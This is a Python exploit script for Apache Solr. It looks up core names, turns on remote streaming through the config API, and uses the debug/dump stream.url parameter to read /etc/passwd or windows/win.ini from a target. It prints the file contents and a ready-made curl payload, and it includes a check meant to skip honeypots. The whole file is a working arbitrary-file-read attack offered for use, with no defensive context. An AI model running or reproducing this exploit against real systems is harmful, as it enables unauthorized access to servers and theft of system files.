import requests
import sys,re,json
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()


def exp(url):

    try:
        dbName = getDb(url)
        
        if dbName:

            session = requests.Session()
            rawBody = "{  \"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
            headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Content-type":"application/json","Accept":"*/*"}
            response = session.post("{}/solr/{}/config".format(url,dbName), data=rawBody, headers=headers)
            

            linux = linuxFile(url,dbName)
            if 'root:x:0:0:' in linux:
                print(linux + '\n')
                exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
                print("[+ !vul  Payload: {}".format(exp))
                return True

            win = windowsFile(url,dbName)
            if 'extensions' in win:
                print(win + '\n')
                exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
                print("[+ !vul Payload: {}".format(exp))
                return True

    except Exception as httperror:
        print("Not vul")

def linuxFile(url,dbName):

    session = requests.Session()
    paramsGet = {"param":"ContentStreams"}
    paramsPost = {"stream.url":"file:////etc/passwd"}
    headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
    response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)

    return str(response.content)

def windowsFile(url,dbName):

    session = requests.Session()
    paramsGet = {"param":"ContentStreams"}
    paramsPost = {"stream.url":"file:///c:windows/win.ini"}
    headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
    response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)

    return str(response.content)


def getDb(url):

    try:
        target = url + '/solr/admin/cores?action=STATUS'
        response = requests.get(target,verify=False,timeout=20)
        data = response.text
        if '关于全网部署360私有云的通知' in data:
            print('[- 蜜罐烦死啦!')
            return False

        try:
            r = re.compile('''"status":{
    "(.*?)":{''')
            Str = re.findall(r,str(data))
            dbName = Str[0]
        except:
            r = re.compile('''<str name="name">(.*?)</str>''')
            Str = re.findall(r,str(data))
            dbName = Str[0]

    except Exception as e:
        return False
    return dbName

if __name__ == "__main__":
    exp(sys.argv[1])
